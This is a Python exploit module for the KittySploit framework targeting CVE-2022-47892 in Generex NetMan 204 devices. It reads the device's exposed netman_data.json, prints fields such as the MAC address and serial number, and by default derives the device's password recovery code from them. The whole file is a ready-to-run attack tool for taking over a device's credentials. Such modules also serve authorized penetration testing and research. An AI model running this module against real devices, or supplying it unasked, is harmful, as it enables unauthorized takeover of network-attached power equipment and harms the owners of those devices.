from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.netman204 import NetMan204


class Module(Auxiliary, Http_client, NetMan204):
    __info__ = {
        "name": "Generex NetMan 204 CVE-2022-47892 - Sensitive Information Disclosure",
        "description": (
            "Generex NetMan 204 exposes sensitive device information via netman_data.json, including "
            "MAC address and serial number which can be leveraged to derive the password recovery code."
        ),
        "author": ["JoelGMSec", "KittySploit Team"],
        "cve": "CVE-2022-47892",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-47892",
        ],
        "tags": ["netman204", "disclosure", "recovery"],
    }

    compute_recovery = OptBool(True, "Also compute the recovery code from disclosed values", required=False)

    def check(self):
        info = self.netman204_fetch_device_info()
        if not info:
            return {"vulnerable": False, "reason": "Unable to fetch netman_data.json", "confidence": "low"}

        if info.get("mac_address") or info.get("serial_number"):
            return {"vulnerable": True, "reason": "Sensitive device information is exposed", "confidence": "high"}
        return {"vulnerable": False, "reason": "No sensitive fields found", "confidence": "low"}

    def run(self):
        info = self.netman204_fetch_device_info()
        if not info:
            print_error("Unable to fetch netman_data.json")
            return False

        rows = []
        for key in sorted(info.keys()):
            rows.append([str(key), str(info.get(key))])
        print_table(["Field", "Value"], rows)

        if self.compute_recovery and info.get("mac_address") and info.get("serial_number"):
            code = self.netman204_recovery_from_mac_serial(info["mac_address"], info["serial_number"])
            print_success(f"Derived recovery code: {code}")

        return True
